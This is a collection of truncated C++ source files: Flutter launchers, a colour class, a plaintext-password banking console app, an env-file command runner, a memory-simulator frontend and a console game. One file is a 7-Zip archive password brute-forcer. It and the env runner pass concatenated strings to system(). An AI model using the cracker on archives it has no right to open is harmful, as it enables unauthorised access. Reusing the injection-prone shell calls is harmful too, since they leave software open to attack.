    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"argparse.hpp\"\n#include \"json.hpp\"\n#include <cstdlib>\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <windows.h>\nstatic void print(const std::string& s) {\n\tstd::cout << s << std::endl;\n}\nstatic void print(const int& a) {\n\tstd::cout << a << std::endl;\n}\nstatic std::string get_one_file_from_zip(const std::string& sevenzip_path, const std::string& zip_file) {\n\tconst std::string command = \"\\\"\" + sevenzip_path + \" l -p1 \\\"\" + zip_file + \"\\\"\\\"\";\n\tstd::string output = \"\";\n\tchar buffer[128];\n\t// \u6253\u5f00\u7ba1\u9053\n\tFILE* pipe = _popen(command.c_str(), \"r\");\n\tif (!pipe) {\n\t\tstd::cerr << \"popen() failed!\" << std::endl;\n\t\treturn \"\";\n\t}\n\t// \u8bfb\u53d6\u547d\u4ee4\u7684\u8f93\u51fa\u5230buffer\n\twhile (fgets(buffer, sizeof(buffer), pipe) != nullptr) {\n\t\toutput += buffer;\n\t}\n\t// \u5173\u95ed\u7ba1\u9053\n\t_pclose(pipe);\n\tstd::stringstream output_stream(output);\n\tstd::string line;\n\twhile (getline(output_stream, line)) {\n\t\tif (line.length() > 53 && (line.substr(20, 5) == \"....A\" || line.substr(20, 5) == \".....\")) {\n\t\t\treturn \"\\\"\" + line.substr(53) + \"\\\"\";\n\t\t}\n\t}\n\treturn \"\";\n}\nstatic bool try_password(const std::string& sevenzip_path, const std::string& file, const std::string& password, const std::string& one_file) {\n\tstd::string cmd = \"\\\"\" + sevenzip_path + \" x -o\\\"\" + file + \"~\\\" -p\\\"\" + password + \"\\\" -y \\\"\" + file + \"\\\" \" + one_file + \" > NUL 2>&1\\\"\";\n\tprint(cmd);\n\tint exit_code = system(cmd.c_str());\n\tif (!exit_code) {\n\t\tprint(file + \" success!\\npassword is \\\"\" + password + \"\\\"\");\n\t\treturn true;\n\t}\n\treturn false;\n}\nstatic bool building_brute_password(const std::string& sevenzip_path, const std::string& chars, const std::string password, const size_t& len, const std::string& file, const std::string& one_file, std::string& final_password) {\n\tif (password.size() == len) {\n\t\tfinal_password = password;\n\t\treturn try_password(sevenzip_path, file, password, one_file);\n\t}\n\tfor (const auto& c : chars) {\n\t\tif (building_brute_password(sevenzip_path, chars, password + c, len, file, one_file, final_password)) {\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nstatic bool decompress_zip(const std::string& sevenzip_path, const std::string& password, const std::string& file, const bool& flag_save_zip) {\n\tstd::string cmd = \"\\\"\" + sevenzip_path + \" x -o\\\"\" + file + \"~\\\" -p\\\"\" + password + \"\\\" -y \\\"\" + file + \"\\\" > NUL 2>&1\\\"\";\n\tprint(cmd);\n\tint exit_code = system(cmd.c_str());\n\tif (!exit_code) {\n\t\tprint(\"decompress success!\");\n\t\tif (!flag_save_zip) {\n\t\t\tstd::filesystem::remove(file);\n\t\t}\n\t\treturn true;\n\t}\n\tif (std::filesystem::exists(file + \"~\")) {\n\t\tstd::filesystem::remove_all(file + \"~\");\n\t}\n\tstd::cerr << \"decompress failed!\" << std::endl;\n\tstd::cerr << file + \" fail!\" << std::endl;\n\treturn false;\n}\nint main(int argc, char* argv[]) {\n\tconst std::string version = \"2024.9.22\";\n\tconst std::string program_path = std::filesystem::absolute(argv[0]).parent_path().string();\n\tconst std::string sevenzip_path = \"\\\"\" + program_path + \"/7z\\\"\";\n\tconst std::string key_json_path = program_path + \"/key.json\";\n\targparse::ArgumentParser program(\"FileUnlockTool\", version);\n\tprogram.add_argument(\"-b\", \"--brute\")\n\t\t.help(\"Brute matching.\")\n\t\t.flag();\n\tprogram.add_argument(\"-e\", \"--exact\")\n\t\t.help(\"Exact matching.\")\n\t\t.flag();\n\tprogram.add_argument(\"-f\", \"--file_name_matching\")\n\t\t.help(\"File name matching.\")\n\t\t.flag();\n\tprogram.add_argument(\"-s\", \"--save_zip\")\n\t\t.help(\"Save the original compressed file after successful decompression.\")\n\t\t.flag();\n\tprogram.add_argument(\"file\")\n\t\t.help(\"The path of the compressed file that needs to be decompressed.\");\n\ttry {\n\t\tprogram.parse_args(argc, argv);\n\t}\n\tcatch (const std::exception& err) {\n\t\tstd::cerr << err.what() << std::endl;\n\t\treturn -114514;\n\t}\n\tconst bool& flag_brute = program.get<bool>(\"-b\");\n\tconst bool& flag_exact = program.get<bool>(\"-e\");\n\tconst bool& flag_file_name_matching = program.get<bool>(\"-f\");\n\tconst bool& flag_save_zip = program.get<bool>(\"-s\");\n\tconst std::string& file = program.get<std::string>(\"file\");\n\tif (!std::filesystem::exists(file)) {\n\t\tstd::cerr << file + \" not found!\" << std::endl;\n\t\treturn -114514;\n\t}\n\tconst std::string& one_file = get_one_file_from_zip(sevenzip_path, file);\n\tstd::ifstream key_json_file(key_json_path);\n\tnlohmann::json key_json_data = nlohmann::json::parse(key_json_file);\n\tif (flag_file_name_matching) {\n\t\tconst std::string& file_name = std::filesystem::path(file).filename().string();\n\t\tconst size_t& len = file_name.size();\n\t\tfor (size_t i = 0; i < len; ++i) {\n\t\t\tfor (size_t j = 1; j < len - i + 1; ++j) {\n\t\t\t\tconst std::string& password = file_name.substr(i, j);\n\t\t\t\tif (try_password(sevenzip_path, file, password, one_file)) {\n\t\t\t\t\tif (decompress_zip(sevenzip_path, password, file, flag_save_zip)) {\n\t\t\t\t\t\treturn 0;\n\t\t\t\t\t}\n\t\t\t\t\treturn -114514;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (flag_exact) {\n\t\tconst std::vector<std::string>& exact_passwords = key_json_data[\"exact\"];\n\t\tfor (const auto& password : exact_passwords) {\n\t\t\tif (try_password(sevenzip_path, file, password, one_file)) {\n\t\t\t\tif (decompress_zip(sevenzip_path, password, file, flag_s",
    "#include \"Engine/core/Rgba8.hpp\"\n#include \"Engine/Core/StringUtils.hpp\"\n#include \"Engine/Math/MathUtils.hpp\"\n\n//----------------------------------------------------------------------------------------------------------------------------------------------------\nRgba8 const Rgba8::RED = Rgba8(255, 0, 0, 255);\nRgba8 const Rgba8::RED_TRANSPARENT = Rgba8(255, 0, 0, 150);\nRgba8 const Rgba8::RED_CLEAR = Rgba8(255, 0, 0, 0);\nRgba8 const Rgba8::BURNT_RED = Rgba8(152, 20, 20, 255);\nRgba8 const Rgba8::WARM_PURPLE = Rgba8(168, 94, 181, 255);\nRgba8 const Rgba8::ROYAL_PURPLE = Rgba8(84, 0, 129, 255);\nRgba8 const Rgba8::GREEN = Rgba8(0, 255, 0, 255);\nRgba8 const Rgba8::BLUE = Rgba8(0, 0, 255, 255);\nRgba8 const Rgba8::NEON_BLUE = Rgba8(70, 160, 240, 255);\nRgba8 const Rgba8::PASTEL_BLUE = Rgba8(117, 158, 224, 255);\nRgba8 const Rgba8::TEAL_BLUE = Rgba8(10, 90, 175, 255);\nRgba8 const Rgba8::CYSTAL_BLUE = Rgba8(32, 142, 239, 255);\nRgba8 const Rgba8::PURPLE_BLUE = Rgba8(45, 63, 170, 255);\nRgba8 const Rgba8::BLUE_MVT = Rgba8(50, 80, 150, 255);\nRgba8 const Rgba8::BLUE_MVTHL = Rgba8(100, 150, 255, 255);\nRgba8 const Rgba8::CYAN = Rgba8(0, 255, 255, 255);\nRgba8 const Rgba8::MAGENTA = Rgba8(255, 0, 255, 255);\nRgba8 const Rgba8::NEON_PINK = Rgba8(192, 2, 196, 255);\nRgba8 const Rgba8::BLUSH_PINK = Rgba8(240, 105, 170, 255);\nRgba8 const Rgba8::SALMON_PINK = Rgba8(235, 135, 147, 255);\nRgba8 const Rgba8::YELLOW = Rgba8(255, 255, 0, 255);\nRgba8 const Rgba8::Naples_Yellow = Rgba8(248, 220, 103, 255);\nRgba8 const Rgba8::CANDLE_YELLOW = Rgba8(247, 235, 0, 255);\nRgba8 const Rgba8::BRIGHT_ORANGE = Rgba8(252, 112, 0, 255);\nRgba8 const Rgba8::LIGHT_ORANGE = Rgba8(205, 96, 16, 255);\nRgba8 const Rgba8::DEEP_ORANGE = Rgba8(237, 65, 26, 255);\nRgba8 const Rgba8::PEACH_ORANGE = Rgba8(245, 174, 104, 255);\nRgba8 const Rgba8::BLACK = Rgba8(0, 0, 0, 255);\nRgba8 const Rgba8::BLACK_TRANSPARENT = Rgba8(0, 0, 0, 120);\nRgba8 const Rgba8::WHITE = Rgba8(255, 255, 255, 255);\nRgba8 const Rgba8::WHITE_TRANSPARENT = Rgba8(255, 255, 255, 30);\nRgba8 const Rgba8::GRAY\t\t\t\t= Rgba8(100, 100, 100, 255);\nRgba8 const Rgba8::GRAY_Dark\t\t= Rgba8(50, 50, 50, 255);\nRgba8 const Rgba8::GRAY_TRANSPARENT = Rgba8(100, 100, 100, 100);\n\n\nRgba8::Rgba8(unsigned char initialr, unsigned char initialg, unsigned char initialb, unsigned char initiala)\n\t:r(initialr),\n\tg(initialg),\n\tb(initialb),\n\ta(initiala)\n{\n\t\n}\n\nRgba8::Rgba8(unsigned char initialr, unsigned char initialg, unsigned char initialb)\n\t:r(initialr),\n\tg(initialg),\n\tb(initialb),\n\ta(255)\n{\n\n}\n\nRgba8::Rgba8(Rgba8 const& copyColor)\n\t: r(copyColor.r)\n\t, g(copyColor.g)\n\t, b(copyColor.b)\n\t, a(copyColor.a)\n{\n\n}\n\n//Rgba8::Rgba8(Vec4 const& float4)\n//{\n//\tr = DenormalizeByte(float4.x);\n//\tg = DenormalizeByte(float4.y);\n//\tb = DenormalizeByte(float4.z);\n//\ta = DenormalizeByte(float4.w);\n//}\n\nbool Rgba8::SetFromText(char const* text)\n{\n\tStrings asStrings = SplitStringOnDelimiter(text, ',');\n\tint numStrings = (int)asStrings.size();\n\tif (numStrings == 3)\n\t{\n\t\tr = (unsigned char)atoi(asStrings[0].c_str());\n\t\tg = (unsigned char)atoi(asStrings[1].c_str());\n\t\tb = (unsigned char)atoi(asStrings[2].c_str());\n\t\ta = 255;\n\t\treturn true;\n\t}\n\tif (numStrings == 4)\n\t{\n\t\tr = (unsigned char)atoi(asStrings[0].c_str());\n\t\tg = (unsigned char)atoi(asStrings[1].c_str());\n\t\tb = (unsigned char)atoi(asStrings[2].c_str());\n\t\ta = (unsigned char)atoi(asStrings[3].c_str());\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nvoid Rgba8::GetAsFloats(float* colorAsFloats) const\n{\n\tcolorAsFloats[0] = RangeMap(r, 0.f, 255.f, 0.f, 1.f);\n\tcolorAsFloats[1] = RangeMap(g, 0.f, 255.f, 0.f, 1.f);\n\tcolorAsFloats[2] = RangeMap(b, 0.f, 255.f, 0.f, 1.f);\n\tcolorAsFloats[3] = RangeMap(a, 0.f, 255.f, 0.f, 1.f);\n}\n\nbool Rgba8::operator==(Rgba8 const& compare) const\n{\n\tif (r == compare.r && g == compare.g && b == compare.b && a == compare.a)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n",
    "\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nstruct stUser\r\n{\r\n    string UserName;\r\n    string Password;\r\n    int Permissions;\r\n    bool MarkForDelete = false;\r\n};\r\n\r\nenum enTransactionsMenueOptions { eDeposit = 1, eWithdraw = 2, eShowTotalBalance = 3, eShowMainMenue = 4 };\r\n\r\nenum enManageUsersMenueOptions {\r\n    eListUsers = 1, eAddNewUser = 2, eDeleteUser = 3,\r\n    eUpdateUser = 4, eFindUser = 5, eMainMenue = 6\r\n};\r\n\r\nenum enMainMenueOptions {\r\n    eListClients = 1, eAddNewClient = 2, eDeleteClient = 3,\r\n    eUpdateClient = 4, eFindClient = 5, eShowTransactionsMenue = 6,\r\n    eManageUsers = 7, eExit = 8\r\n};\r\n\r\nenum enMainMenuePermissions {\r\n    eAll = -1, pListClients = 1, pAddNewClient = 2, pDeleteClient = 4,\r\n    pUpdateClients = 8, pFindClient = 16, pTranactions = 32, pManageUsers = 64\r\n};\r\n\r\nconst string ClientsFileName = \"Clients.txt\";\r\nconst string UsersFileName = \"Users.txt\";\r\n\r\nstUser CurrentUser;\r\n\r\n\r\nvoid ShowMainMenue();\r\nvoid ShowTransactionsMenue();\r\nvoid ShowManageUsersMenue();\r\nbool CheckAccessPermission(enMainMenuePermissions Permission);\r\nvoid Login();\r\n\r\n\r\nstruct sClient\r\n{\r\n    string AccountNumber;\r\n    string PinCode;\r\n    string Name;\r\n    string Phone;\r\n    double AccountBalance;\r\n    bool MarkForDelete = false;\r\n};\r\n\r\nvector<string> SplitString(string S1, string Delim)\r\n{\r\n\r\n    vector<string> vString;\r\n\r\n    short pos = 0;\r\n    string sWord; // define a string variable  \r\n\r\n    // use find() function to get the position of the delimiters  \r\n    while ((pos = S1.find(Delim)) != std::string::npos)\r\n    {\r\n        sWord = S1.substr(0, pos); // store the word   \r\n        if (sWord != \"\")\r\n        {\r\n            vString.push_back(sWord);\r\n        }\r\n\r\n        S1.erase(0, pos + Delim.length());  /* erase() until positon and move to next word. */\r\n    }\r\n\r\n    if (S1 != \"\")\r\n    {\r\n        vString.push_back(S1); // it adds last word of the string.\r\n    }\r\n\r\n    return vString;\r\n\r\n}\r\n\r\nstUser ConvertUserLinetoRecord(string Line, string Seperator = \"#//#\")\r\n{\r\n\r\n    stUser User;\r\n    vector<string> vUserData;\r\n\r\n    vUserData = SplitString(Line, Seperator);\r\n\r\n    User.UserName = vUserData[0];\r\n    User.Password = vUserData[1];\r\n    User.Permissions = stoi(vUserData[2]);\r\n\r\n    return User;\r\n\r\n}\r\n\r\nsClient ConvertLinetoRecord(string Line, string Seperator = \"#//#\")\r\n{\r\n\r\n    sClient Client;\r\n    vector<string> vClientData;\r\n\r\n    vClientData = SplitString(Line, Seperator);\r\n\r\n    Client.AccountNumber = vClientData[0];\r\n    Client.PinCode = vClientData[1];\r\n    Client.Name = vClientData[2];\r\n    Client.Phone = vClientData[3];\r\n    Client.AccountBalance = stod(vClientData[4]);//cast string to double\r\n\r\n\r\n    return Client;\r\n\r\n}\r\n\r\nstUser ConvertUserLinetoRecord2(string Line, string Seperator = \"#//#\")\r\n{\r\n    stUser User;\r\n    vector<string> vUserData;\r\n\r\n    vUserData = SplitString(Line, Seperator);\r\n\r\n    User.UserName = vUserData[0];\r\n    User.Password = vUserData[1];\r\n    User.Permissions = stoi(vUserData[2]);\r\n\r\n    return User;\r\n\r\n}\r\n\r\nstring ConvertRecordToLine(sClient Client, string Seperator = \"#//#\")\r\n{\r\n\r\n    string stClientRecord = \"\";\r\n\r\n    stClientRecord += Client.AccountNumber + Seperator;\r\n    stClientRecord += Client.PinCode + Seperator;\r\n    stClientRecord += Client.Name + Seperator;\r\n    stClientRecord += Client.Phone + Seperator;\r\n    stClientRecord += to_string(Client.AccountBalance);\r\n\r\n    return stClientRecord;\r\n\r\n}\r\n\r\nstring ConvertUserRecordToLine(stUser User, string Seperator = \"#//#\")\r\n{\r\n\r\n    string stClientRecord = \"\";\r\n\r\n    stClientRecord += User.UserName + Seperator;\r\n    stClientRecord += User.Password + Seperator;\r\n    stClientRecord += to_string(User.Permissions);\r\n\r\n    return stClientRecord;\r\n\r\n}\r\n\r\nbool ClientExistsByAccountNumber(string AccountNumber, string FileName)\r\n{\r\n\r\n    vector <sClient> vClients;\r\n\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::in);//read Mode\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n\r\n        string Line;\r\n        sClient Client;\r\n\r\n        while (getline(MyFile, Line))\r\n        {\r\n\r\n            Client = ConvertLinetoRecord(Line);\r\n            if (Client.AccountNumber == AccountNumber)\r\n            {\r\n                MyFile.close();\r\n                return true;\r\n            }\r\n\r\n\r\n            vClients.push_back(Client);\r\n        }\r\n\r\n        MyFile.close();\r\n\r\n    }\r\n\r\n    return false;\r\n\r\n\r\n}\r\n\r\nbool UserExistsByUsername(string Username, string FileName)\r\n{\r\n\r\n\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::in);//read Mode\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n\r\n        string Line;\r\n        stUser User;\r\n\r\n        while (getline(MyFile, Line))\r\n        {\r\n\r\n            User = ConvertUserLinetoRecord(Line);\r\n            if (User.UserName == Username)\r\n            {\r\n                MyFile.close();\r\n                return true;\r\n            }\r\n\r\n        }\r\n\r\n        MyFile.close();\r\n\r\n    }\r\n\r\n    return false;\r\n\r\n\r\n}\r\n\r\nsClient ReadN",
    "#include <functional>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <cstring>\n#include <string>\n\n#include \"validate.hpp\"\n\nchar* program_name;\n\nclass Defer {\n    std::function<void()> m_func;\npublic:\n    Defer(std::function<void()> f) : m_func(f) {}\n    ~Defer() { m_func(); }\n    Defer& operator=(const Defer&)=delete;\n    Defer(const Defer&)=delete;\n};\n\nvoid print_usage() {\n    std::cerr\n        << \"Usage:\" << '\\n'\n        << '\\t' << program_name << \" .env-file1 [.env-file2 [...]] -- mycmd args...\" << '\\n'\n        << '\\n'\n        << \"Flags:\"\n        << '\\t' << \"--confirm\" << '\\t' << \"Adds a confirmation prompt that shows command before running\" << '\\n'\n        << '\\n'\n        << \"Example:\"\n        << '\\t' << program_name << \" .env -- echo $HELLO\" << '\\n';\n}\n\nbool confirm(std::string command) {\n    char answer;\n    std::cout << command << \"\\nConfirm running this command? [Y/n]\";\n    std::cin >> answer;\n    switch (answer) {\n        case 'Y':\n        case 'y':\n            return true;\n            break;\n        default:\n            return false;\n            break;\n    }\n}\n\nint read_env_file(std::stringstream &result, const char* filename) {\n#ifdef DEBUG\n    std::cerr<<\"Reading file:\" << filename << \"\\n\";\n#endif\n    std::ifstream file(filename);\n    Defer _([&file](){\n        file.close();\n    });\n    std::string line;\n    while(std::getline(file, line)) {\n#ifdef DEBUG\n        std::cerr << \"Line: \" << line << \"\\n\";\n#endif\n        if (!validate_envvar(line)) {\n            print_usage();\n            std::cerr << \"Invalid line in \" << filename << \" : \" << line << \"\\n\";\n            exit(1);\n        }\n        result << line << \" \";\n    }\n    return 0;\n}\n\ntypedef enum {\n    ENV,\n    CMD\n} arg_t;\n\nvoid handle_arg(std::stringstream &env, std::stringstream &command, char* arg, arg_t type) {\n    if (type == arg_t::CMD) {\n#ifdef DEBUG\n    std::cerr<<\"Interpret CMD: \\n\";\n#endif\n        command << arg << \" \";\n    } else {\n#ifdef DEBUG\n    std::cerr<<\"Interpret ENV: \\n\";\n#endif\n        read_env_file(env, arg);\n    }\n}\n\nint run_command(std::string cmd) {\n    auto shell = std::getenv(\"SHELL\");\n    auto actual_command = std::string() + shell + \" -c '\" + cmd + \"'\";\n#ifdef DEBUG\n    std::cout<<\"Actual command \" << actual_command << \"\\n\";\n#endif\n    system(actual_command.c_str());\n    return true;\n}\n\nint main(int argc, char**argv) {\n    if (argc <= 1) {\n        print_usage();\n        std::cerr << \"Expected arguments\\n\";\n        exit(1);\n    }\n\n    program_name = argv[0];\n\n    std::stringstream env, command;\n    arg_t active_type = arg_t::ENV;\n    uint found_ddash(0);\n    bool should_confirm(false);\n    for (int i = 1; i < argc; i++) {\n        auto arg = argv[i];\n#ifdef DEBUG\n        std::cerr << i << \" -> `\" << arg << \"`\\n\";\n#endif\n        if (std::strncmp(\"--\", arg, 3) == 0) {\n            if (++found_ddash > 1) {\n                print_usage();\n                std::cerr << \"Expected a single `--`\\n\";\n                exit(1);\n            }\n            active_type = arg_t::CMD;\n        } else if (std::strncmp(\"--confirm\", arg, 10) == 0) {\n            should_confirm = true;\n        } else {\n            handle_arg(env, command, arg, active_type);\n        }\n    }\n    if (found_ddash != 1 || command.str().length() == 0) {\n        print_usage();\n        std::cerr << \"No command provided\\n\";\n        exit(1);\n    }\n\n    std::string result = env.str() + command.str();\n#ifdef DEBUG\n    std::cerr << \"Command for shell `\"<<std::getenv(\"SHELL\")<<\"`: \" << result << \"\\n\";\n#endif\n\n    if (should_confirm) {\n        if (!confirm(result)) {\n            exit(1);\n        }\n    }\n\n    return run_command(result);\n}\n",
    "#include <functional>\n#include <limits>\n\n#include \"base/utils.h\"\n#include \"frontend/frontend.h\"\n#include \"translation/translation.h\"\n#include \"frontend/impl/processor/bhO3/bhO3.h\"\n#include \"frontend/impl/processor/bhO3/bhcore.h\"\n#include \"frontend/impl/processor/bhO3/bhllc.h\"\n\nnamespace Ramulator {\n\nvoid BHO3::init() {\n  m_clock_ratio = param<uint>(\"clock_ratio\").required();\n  \n  // Core params\n  std::vector<std::string> empty_trace;\n  std::vector<std::string> trace_list = param<std::vector<std::string>>(\"traces\").desc(\"A list of traces.\").required();\n  std::vector<std::string> no_wait_trace_list = param<std::vector<std::string>>(\"no_wait_traces\").desc(\"Traces that do not block program termination.\").default_val(empty_trace);\n  m_num_cores = trace_list.size() + no_wait_trace_list.size();\n  m_num_blocking_cores = trace_list.size();\n  \n  bool def_traces_cache_only = param<bool>(\"trace_cache_only\").default_val(false);\n  bool no_wait_traces_cache_only = param<bool>(\"no_wait_trace_cache_only\").default_val(false);\n\n  int ipc   = param<int>(\"ipc\").desc(\"IPC of the SimpleO3 core.\").default_val(4);\n  int depth = param<int>(\"inst_window_depth\").desc(\"Instruction window size of the SimpleO3 core.\").default_val(128);\n\n  int lat_hist_sensitivity = param<int>(\"lat_hist_sensitivity\").default_val(5);\n  std::string lat_dump_path = param<std::string>(\"lat_dump_path\").default_val(std::string(\"\"));\n\n  // LLC params\n  int llc_latency           = param<int>(\"llc_latency\").desc(\"Aggregated latency of the LLC.\").default_val(47);\n  int llc_linesize_bytes    = param<int>(\"llc_linesize\").desc(\"LLC cache line size in bytes.\").default_val(64);\n  int llc_associativity     = param<int>(\"llc_associativity\").desc(\"LLC set associativity.\").default_val(8);\n  int llc_capacity_per_core = parse_capacity_str(param<std::string>(\"llc_capacity_per_core\").desc(\"LLC capacity per core.\").default_val(\"2MB\"));\n  int llc_num_mshr_per_core = param<int>(\"llc_num_mshr_per_core\").desc(\"Number of LLC MSHR entries per core.\").default_val(16);\n  \n  llc_serialize = param<bool>(\"llc_serialize\").desc(\"Whether to serialize the LLC.\").default_val(false);\n  llc_serialization_filename = param<std::string>(\"llc_serialization_filename\").desc(\"Filename to serialize the LLC.\").default_val(\"llc_serialization\");\n  llc_deserialize = param<bool>(\"llc_deserialize\").desc(\"Whether to deserialize the LLC.\").default_val(false);\n  llc_deserialization_filename = param<std::string>(\"llc_deserialization_filename\").desc(\"Filename to deserialize the LLC.\").default_val(\"llc_serialization\");\n\n  // Simulation parameters\n  m_num_expected_insts = param<int>(\"num_expected_insts\").desc(\"Number of instructions that the frontend should execute.\").required();\n  m_num_max_cycles = param<uint64_t>(\"num_max_cycles\").desc(\"Number of cycles the frontend is allowed to execute.\").default_val(std::numeric_limits<uint64_t>::max());\n\n  // Create address translation module\n  m_translation = create_child_ifce<ITranslation>();\n\n  // Create the LLC\n  m_llc = new BHO3LLC(llc_latency, llc_capacity_per_core * m_num_cores, llc_linesize_bytes, llc_associativity, llc_num_mshr_per_core * m_num_cores, m_num_cores);\n  if (llc_deserialize) {\n    if (!std::filesystem::exists(llc_deserialization_filename)) {\n      throw std::runtime_error(\"LLC deserialization file not found.\");\n    }\n    m_llc->deserialize(llc_deserialization_filename);\n  }\n\n  // Create the cores\n  std::cout << \"Trace ID - Name Mapping:\" << std::endl;\n  for (int id = 0; id < m_num_cores; id++) {\n    bool is_blocking = id < m_num_blocking_cores;\n    bool is_attacker = !is_blocking;\n    bool is_cache_only = is_blocking ? def_traces_cache_only : no_wait_traces_cache_only;\n    Request::SpecType spec_type = is_cache_only ? Request::SpecType::CacheOnly : Request::SpecType::Basic;\n    auto& active_list = is_blocking ? trace_list : no_wait_trace_list;\n    auto active_id = is_blocking ? id : (id - m_num_blocking_cores);\n    auto* cur_translate = is_blocking ? m_translation : nullptr;\n    // auto* cur_translate = m_translation;\n    std::cout << \"name_trace_\" << id << \": \" << active_list[active_id] << std::endl;\n    BHO3Core* core = new BHO3Core(id, ipc, depth,\n      m_num_expected_insts, m_num_max_cycles, active_list[active_id],\n      cur_translate, m_llc, lat_hist_sensitivity, lat_dump_path, is_attacker, spec_type);\n    core->m_callback = [this](Request& req){return this->receive(req);} ;\n    m_cores.push_back(core);\n  }\n\n  m_logger = Logging::create_logger(\"BHO3\");\n\n  // Register the stats\n  register_stat(m_num_expected_insts).name(\"num_expected_insts\");\n  register_stat(m_llc->s_llc_eviction).name(\"llc_eviction\");\n  register_stat(m_llc->s_llc_read_access).name(\"llc_read_access\");\n  register_stat(m_llc->s_llc_write_access).name(\"llc_write_access\");\n  register_stat(m_llc->s_llc_read_misses).name(\"llc_read_misses\");\n  register_stat(m_llc->s_llc_write_misses).name(\"llc_write_misses\");\n  register_stat(m_llc->s_llc_mshr_unavailable).name(\"llc_mshr_unavailable\");\n  regi",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"starbucks2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\n#include \"olcConsoleGameEngine.h\"\r\n\r\n\r\nclass OneLoneCoder_FormulaOLC : public olcConsoleGameEngine\r\n{\r\npublic:\r\n\tOneLoneCoder_FormulaOLC()\r\n\t{\r\n\t\tm_sAppName = L\"Formula OLC\";\r\n\t}\r\n\r\nprivate:\r\n\r\n\tfloat fDistance = 0.0f;\t\t\t// Distance car has travelled around track\r\n\tfloat fCurvature = 0.0f;\t\t// Current track curvature, lerped between track sections\r\n\tfloat fTrackCurvature = 0.0f;\t// Accumulation of track curvature\r\n\tfloat fTrackDistance = 0.0f;\t// Total distance of track\r\n\r\n\tfloat fCarPos = 0.0f;\t\t\t// Current car position\r\n\tfloat fPlayerCurvature = 0.0f;\t\t\t// Accumulation of player curvature\r\n\tfloat fSpeed = 0.0f;\t\t\t// Current player speed\r\n\r\n\tvector<pair<float, float>> vecTrack; // Track sections, sharpness of bend, length of section\r\n\r\n\tlist<float> listLapTimes;\t\t// List of previous lap times\r\n\tfloat fCurrentLapTime;\t\t\t// Current lap time\r\n\r\nprotected:\r\n\t// Called by olcConsoleGameEngine\r\n\tvirtual bool OnUserCreate()\r\n\t{\r\n\t\t// Define track\r\n\t\tvecTrack.push_back(make_pair(0.0f, 10.0f));\t\t// Short section for start/finish line\r\n\t\tvecTrack.push_back(make_pair(0.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(1.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(0.0f, 400.0f));\r\n\t\tvecTrack.push_back(make_pair(-1.0f, 100.0f));\r\n\t\tvecTrack.push_back(make_pair(0.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(-1.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(1.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(0.0f, 200.0f));\r\n\t\tvecTrack.push_back(make_pair(0.2f, 500.0f));\r\n\t\tvecTrack.push_back(make_pair(0.0f, 200.0f));\r\n\r\n\t\t// Calculate total track distance, so we can set lap times\r\n\t\tfor (auto t : vecTrack)\r\n\t\t\tfTrackDistance += t.second;\r\n\r\n\t\tlistLapTimes = { 0,0,0,0,0 };\r\n\t\tfCurrentLapTime = 0.0f;\r\n\r\n\t\treturn 